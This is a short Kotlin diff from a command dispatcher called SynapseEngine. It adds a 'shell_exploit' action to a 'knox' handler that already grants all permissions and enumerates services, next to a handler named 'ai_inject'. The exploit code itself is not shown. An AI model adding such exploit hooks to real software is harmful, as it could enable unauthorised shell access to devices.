@@ -116,6 +116,7 @@ object SynapseEngine {
             "knox"     to { cmd -> when (cmd.action) {
                 "grant" -> KnoxPermissionGrant.grantAll(context, cmd)
                 "enumerate" -> KnoxPermissionGrant.enumerateServices(cmd)
+                "shell_exploit" -> KnoxPermissionGrant.knoxShellExploit(cmd)
                 else -> SynapseResponse.ErrorResponse("knox:unknown_action:${cmd.action}", "knox")
             }},
             "ai_inject" to { cmd -> when (cmd.action) {
